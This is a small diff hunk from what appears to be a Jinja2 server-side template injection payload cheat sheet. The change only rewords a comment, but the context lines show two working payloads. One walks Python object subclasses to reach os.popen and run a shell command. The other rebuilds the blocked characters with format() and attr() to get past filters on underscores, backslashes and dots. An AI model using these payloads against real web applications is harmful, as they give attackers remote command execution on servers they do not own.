@@ -10,7 +10,7 @@
 #normal payload
  {{ ''.__class__.__base__.__subclasses__()[103].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
 
-#payload without '_' and without '\' ad without '.'
+#payload without _\.
 {%set c='%c%c'|format(95,95)%}{{dict|attr('mro')()|attr(c~'getitem'~c)(1)|attr(c~'subclasses'~c)()|attr(c~'getitem'~c)(221)|attr(c~'init'~c)|attr(c~'globals'~c)|attr(c~'getitem'~c)('sys')|attr('modules')|attr(c~'getitem'~c)('os')|attr('popen')('ls')|attr('read')()}}
 
 #shortcuts
